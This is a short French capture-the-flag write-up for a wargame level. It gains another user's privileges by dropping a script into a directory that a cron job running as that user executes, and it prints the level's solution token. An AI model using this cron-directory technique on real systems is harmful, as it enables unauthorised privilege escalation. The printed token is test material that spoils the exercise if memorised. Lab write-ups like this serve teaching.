## **Level 05 :**

On est acceuilli par un : “You have new mail”

Voyons ce mail: `cat $MAIL`

output: `**/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05*`

On voit bien qu'on a job cron qui se lance toutes les minutes paires, qui va executer le script ` /usr/sbin/openarenaserver` suivant:

```shell
#/usr/sbin/openarenaserver:

#!/bin/sh
for i in /opt/openarenaserver/* ; do

(ulimit -t 5; bash -x "$i")

rm -f "$i"

done

###
```
(dans `opt/openarenaserver`, il n’y a rien)

On voit que le script va chercher tout les scripts presents dans ce dossier et les executer.

On va donc creer un script dans `opt/openarenaserver` qui lance `/bin/getflag` et redirige sa sortie dans `/tmp/flag.txt`.

```shell
#!/bin/sh
getflag > /tmp/flag.txt
```

> Token : **viuaaale9huek52boumoomioc**